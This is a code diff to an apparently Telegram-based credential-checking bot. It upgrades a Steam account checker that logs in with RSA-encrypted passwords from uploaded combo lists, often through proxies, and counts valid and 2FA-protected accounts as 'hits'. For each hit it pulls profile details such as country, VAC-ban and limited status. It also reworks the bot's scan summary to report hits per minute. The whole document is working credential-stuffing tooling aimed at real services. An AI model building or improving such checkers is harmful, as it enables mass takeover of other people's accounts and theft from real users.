@@ -1264,15 +1264,21 @@ def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str
     return base64.b64encode(hex_bytes).decode('ascii')
 
 def check_steam(username: str, password: str, proxy=None) -> dict:
-    """Returns the same dict format as your other checkers"""
+    """Improved Steam Checker - Rich data + better 2FA handling"""
     result = {
-        'email': username,          # Steam uses username (can be email)
+        'email': username,
         'password': password,
         'success': False,
         'message': '',
         'steamid': None,
         'twofa': False,
-        'status': 'Unknown'
+        'profile_name': 'Unknown',
+        'level': '0',
+        'games': '0',
+        'vac_banned': False,
+        'limited': False,
+        'profile_url': '',
+        'country': 'Unknown'
     }
 
     try:
@@ -1301,9 +1307,8 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         exponent_hex = rsa_resp.publickey_exp.strip()
         timestamp = rsa_resp.timestamp
 
-        # 2. Encrypt password (your pkcs1pad2 + RSA logic)
-        encrypted_b64 = steam_rsa_encrypt(password, modulus_hex, exponent_hex)  # see helper below
-
+        # 2. Encrypt password
+        encrypted_b64 = steam_rsa_encrypt(password, modulus_hex, exponent_hex)
         if not encrypted_b64:
             result['message'] = "RSA encryption failed"
             return result
@@ -1345,8 +1350,8 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
             result['message'] = "Invalid username or password"
         elif x_eresult == '15':
             result['twofa'] = True
+            result['success'] = True
             result['message'] = "2FA Required"
-            result['success'] = True  # still "hit" but needs 2FA
         elif x_eresult == '6':
             result['message'] = "Account not found"
         elif len(resp.content) > 7:
@@ -1355,14 +1360,26 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
             result['success'] = True
             result['steamid'] = auth_resp.steamid
             result['message'] = f"Valid | SteamID: {auth_resp.steamid}"
-        else:
-            result['message'] = "Unknown error"
+
+            # === EXTRA RICH DATA (new part) ===
+            try:
+                # Get player summary
+                summary_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=STEAM_API_KEY&steamids={result['steamid']}"
+                summary_resp = requests.get(summary_url, timeout=15)
+                if summary_resp.status_code == 200:
+                    data = summary_resp.json().get("response", {}).get("players", [{}])[0]
+                    result['profile_name'] = data.get("personaname", "Unknown")
+                    result['profile_url'] = data.get("profileurl", "")
+                    result['country'] = data.get("loccountrycode", "Unknown")
+                    result['vac_banned'] = data.get("vacban", False)
+                    result['limited'] = data.get("personastate", 0) == 0 and data.get("communityvisibilitystate", 0) == 1
+            except:
+                pass  # don't break if extra data fails
 
     except Exception as e:
         result['message'] = f"Error: {str(e)[:80]}"
 
     return result
-
 def check_vivamax(email: str, password: str, proxy=None):
     """Real Vivamax Checker - Fully integrated with your bot"""
     result = {
@@ -2237,19 +2254,32 @@ async def handle_document(update: Update, context: CallbackContext):
             "today_scans": current_stats["today_scans"] + total
         })
 
+        # ====================== IMPROVED SUMMARY WITH 2FA BREAKDOWN ======================
         elapsed = int(time.time() - start_time)
         cpm = int((total / elapsed) * 60) if elapsed > 0 else 0
+
+        mode_name = stats.get("api_mode", "Crunchyroll")
         
+        if mode_name == "Steam":
+            twofa_count = len([hit for hit in hits if hit.get('twofa')])
+            normal_hits = hits_count - twofa_count
+            
+            hit_line = f"✅ <b>HITS:</b> <code>{hits_count}</code> (<code>{normal_hits} Normal + {twofa_count} 2FA</code>)"
+            twofa_line = f"🔐 <b>2FA Required:</b> <code>{twofa_count}</code>\n" if twofa_count > 0 else ""
+        else:
+            hit_line = f"✅ <b>HITS:</b> <code>{hits_count}</code>"
+            twofa_line = ""
+
         summary = f"""
 <b>📊 Scan Completed ✅</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━
 📁 <b>File:</b> <code>{document.file_name}</code>
 📊 <b>Processed:</b> <code>{completed}/{total}</code>
 🧵 <b>Threads:</b> <code>{user_threads}</code>
-📡 Mode: <code>{get_mode_display(stats.get('api_mode'))}</code>
+📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━
-✅ <b>HITS:</b> <code>{hits_count}</code>
-❌ <b>BAD:</b> <code>{bad_count}</code>
+{hit_line}
+{twofa_line}❌ <b>BAD:</b> <code>{bad_count}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━
 ⏱ <b>Elapsed:</b> <code>{elapsed}s</code>
 ⚡ <b>CPM:</b> <code>{cpm}</code>
